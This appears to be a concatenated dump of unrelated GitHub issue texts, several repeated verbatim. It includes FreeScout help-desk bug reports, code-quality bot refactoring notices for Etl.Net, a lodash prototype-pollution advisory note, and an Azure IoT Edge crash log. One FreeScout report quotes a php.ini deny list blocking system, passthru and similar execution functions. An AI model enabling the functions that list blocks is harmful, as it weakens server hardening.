This is a MIME-encapsulated message.

[ ... rest of email continues ... ]
```

I managed to fix the problem by moving this email out of the INBOX and then clicking the "Clear Cache" button in the FreeScout system tools. FreeScout Version: 1.3.1
PHP: 7.2

This version throw sends errors sometimes. 

![Screenshot 2019-07-26 at 8 18 35 AM](https://user-images.githubusercontent.com/5198092/61917140-30254600-af7e-11e9-8924-bf253746d51d.png)
 The tag input box should search and display existing tags as we type. 

Otherwise we end up with so many different spelling for same item and it defeat the existence of tags. 
 Is there any way to change the frequency of the notifications? We're only receiving the email notifications once a day, at around 11pm, instead of when the help requests come in. We have the cron job set up to run once per minute. I keep getting this error in the logs: 

_Error sending email to user | proc_open() has been disabled for  security reasons; File:  /home/ikonzcom/public_html/-locusthelpdesk/vendor/swiftmailer/swiftmailer/lib/classes/Swift/Transport/StreamBuffer.php  (296)_

I have this in the php.ini file in the root directory: 
_disable_functions = dl, system, passthru, pfsockopen, leak, apache_child_terminate, posix_kill, posix_mkfifo, posix_setpgid, posix_setsid, posix_setuid_

I've set it to use PHP7. It is receiving emails, but refuses to send any notifications out. any thoughts? I keep getting this error in the logs: 
_Send error. proc_open() has been disabled for security reasons_
I have this in the php.ini file in the root directory: 
_disable_functions = dl, system, passthru, pfsockopen, leak, apache_child_terminate, posix_kill, posix_mkfifo, posix_setpgid, posix_setsid, posix_setuid_

I've set it to use PHP7. It is receiving emails, but refuses to send any notifications out. any thoughts? I keep getting this error in the logs:

Error sending email to user | proc_open() has been disabled for security reasons; File: helpdesk/vendor/swiftmailer/swiftmailer/lib/classes/Swift/Transport/StreamBuffer.php (296)

I have this in the php.ini file in the root directory:
disable_functions = dl, system, passthru, pfsockopen, leak, apache_child_terminate, posix_kill, posix_mkfifo, posix_setpgid, posix_setsid, posix_setuid

I've set it to use PHP7. It is receiving emails, but refuses to send any notifications out. any thoughts? ![Adding a note does nothing](https://user-images.githubusercontent.com/2365930/61910033-6f767700-af2b-11e9-9082-b63b978eab93.png)

It keeps asking for a message.
 When I want to maintain the System and click "Update now" it throws me this error.
But when I just ignore the Error and reload it shows it is on the latest Version.

Happened twice to me..
Here from 1.3.0 to 1.3.1
![FreeScout](https://user-images.githubusercontent.com/17692860/61877025-78952300-aeee-11e9-8e1a-c14e0a42154a.PNG)

Now after reloading it looks like it is on the latest version:
![FreeScout 1 3 1](https://user-images.githubusercontent.com/17692860/61877255-eccfc680-aeee-11e9-9dcb-ef3aab26ce76.PNG)


My question now: was the update completely successful or just partly?
I know some Systems which update the string of the version but the update is not completed so the System now thinks its up to date, but actually its not.
Is this the case or not?

Best regards,
Martin
 When I want to maintain the System and click "Update now" it throws me this error.
But when I just ignore the Error and reload it shows it is on the latest Version.

Happened twice to me..
Here from 1.3.0 to 1.3.1
![FreeScout](https://user-images.githubusercontent.com/17692860/61877025-78952300-aeee-11e9-8e1a-c14e0a42154a.PNG)

Now after reloading it looks like it is on the latest version:
![FreeScout 1 3 1](https://user-images.githubusercontent.com/17692860/61877255-eccfc680-aeee-11e9-9dcb-ef3aab26ce76.PNG)


My question now: was the update completely successful or just partly?
I know some Systems which update the string of the version but the update is not completed but the System now thinks its up to date.
Is this the case or not?

Best regards,
Martin
 1. Error logs says:

`production.ERROR: file_put_contents(/home/helpdesk/storage/framework/cache/data/5e/3c/5e3cbbed47195384f39edf30b47d8cd8245cdff8): failed to open stream: Permission denied {"exception":"[object] (ErrorException(code: 0): file_put_contents(/home/helpdesk/storage/framework/cache/data/5e/3c/5e3cbbed47195384f39edf30b47d8cd8245cdff8): failed to open stream: Permission denied at /home/helpdesk/vendor/laravel/framework/src/Illuminate/Filesystem/Filesystem.php:122)`

Checked the permission on file "/home/helpdesk/storage/framework/cache/data/5e/3c/5e3cbbed47195384f39edf30b47d8cd8245cdff8", it is 644, changed it to 755. Doesn't help.

2. .env file key exists in `APP_KEY`.
3. Tried clearing the cache, the terminal gives the same permission error. `file_put_contents(/home/helpdesk/storage/framework/cache/data/5e/3c/5e3cbbed47195384f39edf30b47d8cd8245cdff8): failed to open stream: Permission denied`
4. Tried generating a new key. Same error as in Pt.3.

Any ideas?

_Originally posted by @TyrannosaurHex in https://github.com/freescout-helpdesk/freescout/issues/31#issuecomment-508523726_ 1. Error logs says:

`production.ERROR: file_put_contents(/home/helpdesk/storage/framework/cache/data/5e/3c/5e3cbbed47195384f39edf30b47d8cd8245cdff8): failed to open stream: Permission denied {"exception":"[object] (ErrorException(code: 0): file_put_contents(/home/helpdesk/storage/framework/cache/data/5e/3c/5e3cbbed47195384f39edf30b47d8cd8245cdff8): failed to open stream: Permission denied at /home/helpdesk/vendor/laravel/framework/src/Illuminate/Filesystem/Filesystem.php:122)`

Checked the permission on file "/home/helpdesk/storage/framework/cache/data/5e/3c/5e3cbbed47195384f39edf30b47d8cd8245cdff8", it is 644, changed it to 755. Doesn't help.

2. .env file key exists in `APP_KEY`.
3. Tried clearing the cache, the terminal gives the same permission error. `file_put_contents(/home/helpdesk/storage/framework/cache/data/5e/3c/5e3cbbed47195384f39edf30b47d8cd8245cdff8): failed to open stream: Permission denied`
4. Tried generating a new key. Same error as in Pt.3.

Any ideas?

_Originally posted by @TyrannosaurHex in https://github.com/freescout-helpdesk/freescout/issues/31#issuecomment-508523726_ Reported by another user here:
https://github.com/freescout-helpdesk/freescout/issues/248

Not sure why it is requesting CSS/JS resource from example.com

![image](https://user-images.githubusercontent.com/50612266/60415223-354dda00-9bf8-11e9-9b7d-9c9944d4bb99.png)

Any ideas where to fix this?
 Reported by another user here:
https://github.com/freescout-helpdesk/freescout/issues/248

Not sure why it is requesting CSS/JS resource from example.com

![image](https://user-images.githubusercontent.com/50612266/60415223-354dda00-9bf8-11e9-9b7d-9c9944d4bb99.png)

Any ideas where to fix this?
 I'm getting an error when searching:

Syntax error or access violation: 1055 `'[db_name].conversations.number' isn't in GROUP BY`

Full error:


```
SQLSTATE[42000]: Syntax error or access violation: 1055 '[db_name].conversations.number' isn't in GROUP BY (SQL: select `conversations`.* from `conversations` inner join `threads` on `conversations`.`id` = `threads`.`conversation_id` where `conversations`.`mailbox_id` in (1) and (`conversations`.`subject` like %sdf% or `conversations`.`customer_email` like %sdf% or `conversations`.`number` like %sdf% or `conversations`.`id` like %sdf% or `threads`.`body` like %sdf% or `threads`.`from` like %sdf% or `threads`.`to` like %sdf% or `threads`.`cc` like %sdf% or `threads`.`bcc` like %sdf%) group by `conversations`.`id` order by `conversations`.`last_reply_at` asc limit 50 offset 0) {"userId":1,"email":"[email]","exception":"[object] (Illuminate\\Database\\QueryException(code: 42000): SQLSTATE[42000]: Syntax error or access violation: 1055 '[db_name].conversations.number' isn't in GROUP BY (SQL: select `conversations`.* from `conversations` inner join `threads` on `conversations`.`id` = `threads`.`conversation_id` where `conversations`.`mailbox_id` in (1) and (`conversations`.`subject` like %sdf% or `conversations`.`customer_email` like %sdf% or `conversations`.`number` like %sdf% or `conversations`.`id` like %sdf% or `threads`.`body` like %sdf% or `threads`.`from` like %sdf% or `threads`.`to` like %sdf% or `threads`.`cc` like %sdf% or `threads`.`bcc` like %sdf%) group by `conversations`.`id` order by `conversations`.`last_reply_at` asc limit 50 offset 0) at /freescout/vendor/laravel/framework/src/Illuminate/Database/Connection.php:664, Doctrine\\DBAL\\Driver\\PDOException(code: 42000): SQLSTATE[42000]: Syntax error or access violation: 1055 '[db_name].conversations.number' isn't in GROUP BY at /freescout/vendor/doctrine/dbal/lib/Doctrine/DBAL/Driver/PDOConnection.php:79, PDOException(code: 42000): SQLSTATE[42000]: Syntax error or access violation: 1055 '[db_name].conversations.number' isn't in GROUP BY at /freescout/vendor/doctrine/dbal/lib/Doctrine/DBAL/Driver/PDOConnection.php:77)
``` If someone sends an HTML-E-Mail with externally linked pictures the pictures get loaded without warning etc.

There should be an option to disable remote content globally or per Mailbox.
<---------->
138381746
I've selected for refactoring 7 lines of code which are duplicated in 3 file(s) ([1](https://github.com/paillave/Etl.Net/blob/1e5f06c2d25716ba1aba80b0efe932c3ed52eb5e/src/Paillave.Etl.XmlFile/Core/LambdaExpression.ex.cs#L7-L17), [2](https://github.com/paillave/Etl.Net/blob/1e5f06c2d25716ba1aba80b0efe932c3ed52eb5e/src/Paillave.Etl.ExcelFile/Core/LambdaExpression.ex.cs#L7-L17), [3](https://github.com/paillave/Etl.Net/blob/1e5f06c2d25716ba1aba80b0efe932c3ed52eb5e/src/Paillave.Etl.TextFile/Core/LambdaExpression.ex.cs#L7-L17)).  Addressing this will make our codebase more maintainable and improve [Better Code Hub](https://bettercodehub.com)'s **Write Code Once** guideline rating! 👍 

Here's the gist of this guideline:
- **Definition** 📖 
Do not copy code.
- **Why**❓ 
When code is copied, bugs need to be fixed in multiple places. This is both inefficient and a source of regression bugs.
- **How** 🔧 
Avoid duplication by never copy/pasting blocks of code and reduce duplication by extracting shared code, either to a new unit or introduce a superclass if the language permits.

You can find more info about this guideline in [Building Maintainable Software](http://shop.oreilly.com/product/0636920049159.do). 📖 
 
---- 
ℹ️ To know how many _other_ refactoring candidates need addressing to get a guideline compliant, select some by clicking on the 🔲  next to them. The risk profile below the candidates signals (✅) when it's enough! 🏁 


----
Good luck and happy coding! :shipit: :sparkles: :100: I've selected for refactoring 11 lines of code which are duplicated in 2 file(s) ([1](https://github.com/paillave/Etl.Net/blob/1e5f06c2d25716ba1aba80b0efe932c3ed52eb5e/src/Paillave.Etl.XmlFile/Core/Mapping/Visitors/NewInstanceVisitor.cs#L12-L27), [2](https://github.com/paillave/Etl.Net/blob/1e5f06c2d25716ba1aba80b0efe932c3ed52eb5e/src/Paillave.Etl/Core/Mapping/Visitors/NewInstanceVisitor.cs#L12-L27)).  Addressing this will make our codebase more maintainable and improve [Better Code Hub](https://bettercodehub.com)'s **Write Code Once** guideline rating! 👍 

Here's the gist of this guideline:
- **Definition** 📖 
Do not copy code.
- **Why**❓ 
When code is copied, bugs need to be fixed in multiple places. This is both inefficient and a source of regression bugs.
- **How** 🔧 
Avoid duplication by never copy/pasting blocks of code and reduce duplication by extracting shared code, either to a new unit or introduce a superclass if the language permits.

You can find more info about this guideline in [Building Maintainable Software](http://shop.oreilly.com/product/0636920049159.do). 📖 
 
---- 
ℹ️ To know how many _other_ refactoring candidates need addressing to get a guideline compliant, select some by clicking on the 🔲  next to them. The risk profile below the candidates signals (✅) when it's enough! 🏁 


----
Good luck and happy coding! :shipit: :sparkles: :100: I've selected [**XmlObjectReader.ProcessEndOfNode(Stack, string, Action)**](https://github.com/paillave/Etl.Net/blob/3a1911c95090016a5fe45413536430ed0e0b7081/src/Paillave.Etl.XmlFile/Core/XmlObjectReader.cs#L83-L107) for refactoring, which is a unit of **22** lines of code and **3** parameters. Addressing this will make our codebase more maintainable and improve [Better Code Hub](https://bettercodehub.com)'s **Keep Unit Interfaces Small** guideline rating! 👍 

Here's the gist of this guideline:
- **Definition** 📖 
Limit the number of parameters per unit to at most 4.
- **Why**❓ 
Keeping the number of parameters low makes units easier to understand, test and reuse.
- **How** 🔧 
Reduce the number of parameters by grouping related parameters into objects. Alternatively, try extracting parts of units that require fewer parameters.

You can find more info about this guideline in [Building Maintainable Software](http://shop.oreilly.com/product/0636920049159.do). 📖 
 
---- 
ℹ️ To know how many _other_ refactoring candidates need addressing to get a guideline compliant, select some by clicking on the 🔲  next to them. The risk profile below the candidates signals (✅) when it's enough! 🏁 


----
Good luck and happy coding! :shipit: :sparkles: :100: I've selected [**UpdateContextQueryBase.UpdateContextQueryBase(DbContext, string, string, List, List, List, IEntityType, IDictionary)**](https://github.com/paillave/Etl.Net/blob/3a1911c95090016a5fe45413536430ed0e0b7081/src/Paillave.Etl.EntityFrameworkCore/BulkSave/UpdateContextQueryBase.cs#L34-L45) for refactoring, which is a unit of **10** lines of code and **8** parameters. Addressing this will make our codebase more maintainable and improve [Better Code Hub](https://bettercodehub.com)'s **Keep Unit Interfaces Small** guideline rating! 👍 

Here's the gist of this guideline:
- **Definition** 📖 
Limit the number of parameters per unit to at most 4.
- **Why**❓ 
Keeping the number of parameters low makes units easier to understand, test and reuse.
- **How** 🔧 
Reduce the number of parameters by grouping related parameters into objects. Alternatively, try extracting parts of units that require fewer parameters.

You can find more info about this guideline in [Building Maintainable Software](http://shop.oreilly.com/product/0636920049159.do). 📖 
 
---- 
ℹ️ To know how many _other_ refactoring candidates need addressing to get a guideline compliant, select some by clicking on the 🔲  next to them. The risk profile below the candidates signals (✅) when it's enough! 🏁 


----
Good luck and happy coding! :shipit: :sparkles: :100: I've selected [**SaveContextQueryBase.SaveContextQueryBase(DbContext, string, string, List, List, List, List, List)**](https://github.com/paillave/Etl.Net/blob/3a1911c95090016a5fe45413536430ed0e0b7081/src/Paillave.Etl.EntityFrameworkCore/BulkSave/SaveContextQueryBase.cs#L37-L47) for refactoring, which is a unit of **10** lines of code and **8** parameters. Addressing this will make our codebase more maintainable and improve [Better Code Hub](https://bettercodehub.com)'s **Keep Unit Interfaces Small** guideline rating! 👍 

Here's the gist of this guideline:
- **Definition** 📖 
Limit the number of parameters per unit to at most 4.
- **Why**❓ 
Keeping the number of parameters low makes units easier to understand, test and reuse.
- **How** 🔧 
Reduce the number of parameters by grouping related parameters into objects. Alternatively, try extracting parts of units that require fewer parameters.

You can find more info about this guideline in [Building Maintainable Software](http://shop.oreilly.com/product/0636920049159.do). 📖 
 
---- 
ℹ️ To know how many _other_ refactoring candidates need addressing to get a guideline compliant, select some by clicking on the 🔲  next to them. The risk profile below the candidates signals (✅) when it's enough! 🏁 


----
Good luck and happy coding! :shipit: :sparkles: :100: I've selected [**AggregateGroupedSubject.AggregateGroupedSubject(IPushObservable, Func, Func, Func, Func)**](https://github.com/paillave/Etl.Net/blob/3a1911c95090016a5fe45413536430ed0e0b7081/src/Paillave.Etl/Reactive/Operators/AggregateGroupedSubject.cs#L19-L43) for refactoring, which is a unit of **24** lines of code and **5** parameters. Addressing this will make our codebase more maintainable and improve [Better Code Hub](https://bettercodehub.com)'s **Keep Unit Interfaces Small** guideline rating! 👍 

Here's the gist of this guideline:
- **Definition** 📖 
Limit the number of parameters per unit to at most 4.
- **Why**❓ 
Keeping the number of parameters low makes units easier to understand, test and reuse.
- **How** 🔧 
Reduce the number of parameters by grouping related parameters into objects. Alternatively, try extracting parts of units that require fewer parameters.

You can find more info about this guideline in [Building Maintainable Software](http://shop.oreilly.com/product/0636920049159.do). 📖 
 
---- 
ℹ️ To know how many _other_ refactoring candidates need addressing to get a guideline compliant, select some by clicking on the 🔲  next to them. The risk profile below the candidates signals (✅) when it's enough! 🏁 


----
Good luck and happy coding! :shipit: :sparkles: :100: I've selected [**AggregateSubject.AggregateSubject(IPushObservable, Func, Func, Func, Func)**](https://github.com/paillave/Etl.Net/blob/3a1911c95090016a5fe45413536430ed0e0b7081/src/Paillave.Etl/Reactive/Operators/AggregateSubject.cs#L18-L41) for refactoring, which is a unit of **22** lines of code and **5** parameters. Addressing this will make our codebase more maintainable and improve [Better Code Hub](https://bettercodehub.com)'s **Keep Unit Interfaces Small** guideline rating! 👍 

Here's the gist of this guideline:
- **Definition** 📖 
Limit the number of parameters per unit to at most 4.
- **Why**❓ 
Keeping the number of parameters low makes units easier to understand, test and reuse.
- **How** 🔧 
Reduce the number of parameters by grouping related parameters into objects. Alternatively, try extracting parts of units that require fewer parameters.

You can find more info about this guideline in [Building Maintainable Software](http://shop.oreilly.com/product/0636920049159.do). 📖 
 
---- 
ℹ️ To know how many _other_ refactoring candidates need addressing to get a guideline compliant, select some by clicking on the 🔲  next to them. The risk profile below the candidates signals (✅) when it's enough! 🏁 


----
Good luck and happy coding! :shipit: :sparkles: :100: I've selected [**AggregateGroupedComparableSubject.AggregateGroupedComparableSubject(IPushObservable, Func, IEqualityComparer, Func, Func)**](https://github.com/paillave/Etl.Net/blob/3a1911c95090016a5fe45413536430ed0e0b7081/src/Paillave.Etl/Reactive/Operators/AggregateGroupedComparableSubject.cs#L18-L38) for refactoring, which is a unit of **20** lines of code and **5** parameters. Addressing this will make our codebase more maintainable and improve [Better Code Hub](https://bettercodehub.com)'s **Keep Unit Interfaces Small** guideline rating! 👍 

Here's the gist of this guideline:
- **Definition** 📖 
Limit the number of parameters per unit to at most 4.
- **Why**❓ 
Keeping the number of parameters low makes units easier to understand, test and reuse.
- **How** 🔧 
Reduce the number of parameters by grouping related parameters into objects. Alternatively, try extracting parts of units that require fewer parameters.

You can find more info about this guideline in [Building Maintainable Software](http://shop.oreilly.com/product/0636920049159.do). 📖 
 
---- 
ℹ️ To know how many _other_ refactoring candidates need addressing to get a guideline compliant, select some by clicking on the 🔲  next to them. The risk profile below the candidates signals (✅) when it's enough! 🏁 


----
Good luck and happy coding! :shipit: :sparkles: :100: using https://msdn.microsoft.com/en-us/library/ms950778.aspx I've selected [**LeftJoinSubject.LeftJoinSubject(IPushObservable, IPushObservable, IComparer, Func)**](https://github.com/paillave/Etl.Net/blob/1e5f06c2d25716ba1aba80b0efe932c3ed52eb5e/src/Paillave.Etl/Reactive/Operators/LeftJoinSubject.cs#L26-L116) for refactoring, which is a unit of **85** lines of code. Addressing this will make our codebase more maintainable and improve [Better Code Hub](https://bettercodehub.com)'s **Write Short Units of Code** guideline rating! 👍 

Here's the gist of this guideline:
- **Definition** 📖 
Limit the length of code units to 15 lines of code.
- **Why**❓ 
Small units are easier to analyse, test and reuse.
- **How** 🔧 
When writing new units, don't let them grow above 15 lines of code. When a unit grows beyond this, split it in smaller units of no longer than 15 lines.

You can find more info about this guideline in [Building Maintainable Software](http://shop.oreilly.com/product/0636920049159.do). 📖 
 
---- 
ℹ️ To know how many _other_ refactoring candidates need addressing to get a guideline compliant, select some by clicking on the 🔲  next to them. The risk profile below the candidates signals (✅) when it's enough! 🏁 


----
Good luck and happy coding! :shipit: :sparkles: :100: I've selected for refactoring 7 lines of code which are duplicated in 3 file(s) ([1](https://github.com/paillave/Etl.Net/blob/1e5f06c2d25716ba1aba80b0efe932c3ed52eb5e/src/Paillave.Etl.XmlFile/Core/LambdaExpression.ex.cs#L7-L17), [2](https://github.com/paillave/Etl.Net/blob/1e5f06c2d25716ba1aba80b0efe932c3ed52eb5e/src/Paillave.Etl.ExcelFile/Core/LambdaExpression.ex.cs#L7-L17), [3](https://github.com/paillave/Etl.Net/blob/1e5f06c2d25716ba1aba80b0efe932c3ed52eb5e/src/Paillave.Etl.TextFile/Core/LambdaExpression.ex.cs#L7-L17)).  Addressing this will make our codebase more maintainable and improve [Better Code Hub](https://bettercodehub.com)'s **Write Code Once** guideline rating! 👍 

Here's the gist of this guideline:
- **Definition** 📖 
Do not copy code.
- **Why**❓ 
When code is copied, bugs need to be fixed in multiple places. This is both inefficient and a source of regression bugs.
- **How** 🔧 
Avoid duplication by never copy/pasting blocks of code and reduce duplication by extracting shared code, either to a new unit or introduce a superclass if the language permits.

You can find more info about this guideline in [Building Maintainable Software](http://shop.oreilly.com/product/0636920049159.do). 📖 
 
---- 
ℹ️ To know how many _other_ refactoring candidates need addressing to get a guideline compliant, select some by clicking on the 🔲  next to them. The risk profile below the candidates signals (✅) when it's enough! 🏁 


----
Good luck and happy coding! :shipit: :sparkles: :100: I've selected [**LeftJoinSubject.TryUnstackQueues(Side, Side, LeftJoinParams)**](https://github.com/paillave/Etl.Net/blob/3a1911c95090016a5fe45413536430ed0e0b7081/src/Paillave.Etl/Reactive/Operators/LeftJoinSubject.cs#L27-L72) for refactoring, which is a unit of **43** lines of code and **3** parameters. Addressing this will make our codebase more maintainable and improve [Better Code Hub](https://bettercodehub.com)'s **Keep Unit Interfaces Small** guideline rating! 👍 

Here's the gist of this guideline:
- **Definition** 📖 
Limit the number of parameters per unit to at most 4.
- **Why**❓ 
Keeping the number of parameters low makes units easier to understand, test and reuse.
- **How** 🔧 
Reduce the number of parameters by grouping related parameters into objects. Alternatively, try extracting parts of units that require fewer parameters.

You can find more info about this guideline in [Building Maintainable Software](http://shop.oreilly.com/product/0636920049159.do). 📖 
 
---- 
ℹ️ To know how many _other_ refactoring candidates need addressing to get a guideline compliant, select some by clicking on the 🔲  next to them. The risk profile below the candidates signals (✅) when it's enough! 🏁 


----
Good luck and happy coding! :shipit: :sparkles: :100: I've selected [**LeftJoinSubject.LeftJoinSubject(IPushObservable, IPushObservable, LeftJoinParams)**](https://github.com/paillave/Etl.Net/blob/3a1911c95090016a5fe45413536430ed0e0b7081/src/Paillave.Etl/Reactive/Operators/LeftJoinSubject.cs#L74-L115) for refactoring, which is a unit of **40** lines of code and **3** parameters. Addressing this will make our codebase more maintainable and improve [Better Code Hub](https://bettercodehub.com)'s **Keep Unit Interfaces Small** guideline rating! 👍 

Here's the gist of this guideline:
- **Definition** 📖 
Limit the number of parameters per unit to at most 4.
- **Why**❓ 
Keeping the number of parameters low makes units easier to understand, test and reuse.
- **How** 🔧 
Reduce the number of parameters by grouping related parameters into objects. Alternatively, try extracting parts of units that require fewer parameters.

You can find more info about this guideline in [Building Maintainable Software](http://shop.oreilly.com/product/0636920049159.do). 📖 
 
---- 
ℹ️ To know how many _other_ refactoring candidates need addressing to get a guideline compliant, select some by clicking on the 🔲  next to them. The risk profile below the candidates signals (✅) when it's enough! 🏁 


----
Good luck and happy coding! :shipit: :sparkles: :100: I've selected [**FlatFileValuesProvider.PushValues(TIn, Action)**](https://github.com/paillave/Etl.Net/blob/1e5f06c2d25716ba1aba80b0efe932c3ed52eb5e/src/Paillave.Etl.TextFile/ValuesProviders/FlatFileValuesProvider.cs#L28-L85) for refactoring, which is a unit of **55** lines of code. Addressing this will make our codebase more maintainable and improve [Better Code Hub](https://bettercodehub.com)'s **Write Short Units of Code** guideline rating! 👍 

Here's the gist of this guideline:
- **Definition** 📖 
Limit the length of code units to 15 lines of code.
- **Why**❓ 
Small units are easier to analyse, test and reuse.
- **How** 🔧 
When writing new units, don't let them grow above 15 lines of code. When a unit grows beyond this, split it in smaller units of no longer than 15 lines.

You can find more info about this guideline in [Building Maintainable Software](http://shop.oreilly.com/product/0636920049159.do). 📖 
 
---- 
ℹ️ To know how many _other_ refactoring candidates need addressing to get a guideline compliant, select some by clicking on the 🔲  next to them. The risk profile below the candidates signals (✅) when it's enough! 🏁 


----
Good luck and happy coding! :shipit: :sparkles: :100: I've selected [**ExcelRowsValuesProvider.ReadRow(ExcelWorksheet, ExcelFileReader, int, IDictionary)**](https://github.com/paillave/Etl.Net/blob/3a1911c95090016a5fe45413536430ed0e0b7081/src/Paillave.Etl.ExcelFile/ValuesProviders/ExcelRowsValuesProvider.cs#L32-L68) for refactoring, which is a unit of **35** lines of code and **4** parameters. Addressing this will make our codebase more maintainable and improve [Better Code Hub](https://bettercodehub.com)'s **Keep Unit Interfaces Small** guideline rating! 👍 

Here's the gist of this guideline:
- **Definition** 📖 
Limit the number of parameters per unit to at most 4.
- **Why**❓ 
Keeping the number of parameters low makes units easier to understand, test and reuse.
- **How** 🔧 
Reduce the number of parameters by grouping related parameters into objects. Alternatively, try extracting parts of units that require fewer parameters.

You can find more info about this guideline in [Building Maintainable Software](http://shop.oreilly.com/product/0636920049159.do). 📖 
 
---- 
ℹ️ To know how many _other_ refactoring candidates need addressing to get a guideline compliant, select some by clicking on the 🔲  next to them. The risk profile below the candidates signals (✅) when it's enough! 🏁 


----
Good luck and happy coding! :shipit: :sparkles: :100: I've selected [**LeftJoinSubject.LeftJoinSubject(IPushObservable, IPushObservable, IComparer, Func)**](https://github.com/paillave/Etl.Net/blob/1e5f06c2d25716ba1aba80b0efe932c3ed52eb5e/src/Paillave.Etl/Reactive/Operators/LeftJoinSubject.cs#L26-L116) for refactoring, which is a unit of **85** lines of code. Addressing this will make our codebase more maintainable and improve [Better Code Hub](https://bettercodehub.com)'s **Write Short Units of Code** guideline rating! 👍 

Here's the gist of this guideline:
- **Definition** 📖 
Limit the length of code units to 15 lines of code.
- **Why**❓ 
Small units are easier to analyse, test and reuse.
- **How** 🔧 
When writing new units, don't let them grow above 15 lines of code. When a unit grows beyond this, split it in smaller units of no longer than 15 lines.

You can find more info about this guideline in [Building Maintainable Software](http://shop.oreilly.com/product/0636920049159.do). 📖 
 
---- 
ℹ️ To know how many _other_ refactoring candidates need addressing to get a guideline compliant, select some by clicking on the 🔲  next to them. The risk profile below the candidates signals (✅) when it's enough! 🏁 


----
Good luck and happy coding! :shipit: :sparkles: :100:
<---------->
138433894
https://github.com/rodrigoap/react-chart-histogram/blob/3485929049f613d6c681959440fef6801ce4935d/src/index.js#L217

On devices with window.devicePixelRatio > 1.0 this code will cause each subsequent render/update to become larger and larger... CVE-2018-16487
More information
low severity
Vulnerable versions: < 4.17.11
Patched version: 4.17.11

A prototype pollution vulnerability was found in lodash <4.17.11 where the functions merge, mergeWith, and defaultsDeep can be tricked into adding or modifying properties of Object.prototype.
 On some browsers animation is broken. On some browsers animation is broken. CVE-2018-16487
More information
low severity
Vulnerable versions: < 4.17.11
Patched version: 4.17.11

A prototype pollution vulnerability was found in lodash <4.17.11 where the functions merge, mergeWith, and defaultsDeep can be tricked into adding or modifying properties of Object.prototype.

<---------->
138646782
## Expected Behavior

The edgeAgent and the whole runtime runs reliably and stable, without interruptions. 

(When the network connection is unstable, the runtime is able to run disconnected and reconnects when the network is again available. Messages are buffered locally and none are lost as long as storage on device permits.)

## Current Behavior

At our pilot projects, our edge deployment fails unexpectedly, apparently due to an error in the edgeAgent. We have only two pilot devices at different locations abroad, both of which have failed at some point. Currently, we have no SSH access to the devices, although we do have logs in log analytics thanks to an [open source custom module](https://github.com/veyalla/logspout-loganalytics). In the past, we have noted how a restart might help in this case, but that is off course not an option in production.

Besides the logging module, we have 3 extra custom modules, none of which are showing unexpected logs.

The problem occured suddenly yesterday around 19.45 UTC. Around this time, the last telemetry data from one of our custom modules arrived in our database. 

Before bringing the devices to their testing site, the "iotedge check" command was run and no errors were displayed. 

The edgeAgent seems to have crashed with a System.TimeoutException causing "Agent reconcile concluded with errors".  All our custom modules seem to be offline and not reported by the device. 

We consider this a critical issue which definitely needs to be resolved before moving to production in the near future. 

Attached below are:
- a screenshot of the current status of the  modules, from the Azure Portal
- the current state of the edgeAgent twin
- the deployment template
- logs from the edgeAgent module
- logs from the edgeHub module

## Context (Environment)

### Output of `iotedge check`

No errors

### Device Information
* Device: Raspberry PI 
* Host OS: Raspbian Stretch 
* Architecture: arm32 
* Container OS: linux containers 

### Runtime Versions
* iotedged: unknown, but installed on 26/11 according to the instructions in the documentation.
* Edge Agent: 1.0.8.4 
* Edge Hub: 1.0.8.4 
* Docker/Moby: unknown, but installed on 26/11 according to the instructions in the documentation.

## Logs

![image](https://user-images.githubusercontent.com/32063689/69873626-23608800-12b9-11ea-8a6d-017c856dad6a.png)

<details>
<summary>edge-agent logs</summary>

```

   at Microsoft.Azure.Devices.Edge.Agent.Service.Program.MainAsync(IConfiguration configuration) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Service/Program.cs:line 196
   at Microsoft.Azure.Devices.Edge.Util.TaskEx.TimeoutAfter(Task task, TimeSpan timeout) in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Util/TaskEx.cs:line 137
System.TimeoutException: Operation timed out
<4> 2019-11-28 20:10:29.063 +00:00 [WRN] - Agent reconcile concluded with errors.
   at Microsoft.Azure.Devices.Edge.Agent.Core.Agent.ReconcileAsync(CancellationToken token) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Core/Agent.cs:line 149
   at Microsoft.Azure.Devices.Edge.Agent.Core.Agent.GetCurrentModuleSetAsync(CancellationToken token) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Core/Agent.cs:line 227
   at Microsoft.Azure.Devices.Edge.Agent.Docker.DockerEnvironment.GetModulesAsync(CancellationToken token) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Docker/DockerEnvironment.cs:line 50
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Version_2019_01_30.ModuleManagementHttpClient.GetModules[T](CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Edgelet/version_2019_01_30/ModuleManagementHttpClient.cs:line 137
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Versioning.ModuleManagementHttpClientVersioned.Execute[T](Func`1 func, String operation) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Edgelet/versioning/ModuleManagementHttpClientVersioned.cs:line 123
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Version_2019_01_30.ModuleManagementHttpClient.HandleException(Exception exception, String operation) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Edgelet/version_2019_01_30/ModuleManagementHttpClient.cs:line 203
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Versioning.ModuleManagementHttpClientVersioned.Execute[T](Func`1 func, String operation)
   at Microsoft.Azure.Devices.Edge.Util.TaskEx.TimeoutAfter[T](Task`1 task, TimeSpan timeout) in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Util/TaskEx.cs:line 121
System.TimeoutException: Operation timed out
<4> 2019-11-28 20:05:43.688 +00:00 [WRN] - Reconcile failed because of the an exception
   at Microsoft.Azure.Devices.Edge.Agent.Core.Agent.ReconcileAsync(CancellationToken token) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Core/Agent.cs:line 149
   at Microsoft.Azure.Devices.Edge.Agent.Core.Agent.GetCurrentModuleSetAsync(CancellationToken token) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Core/Agent.cs:line 227
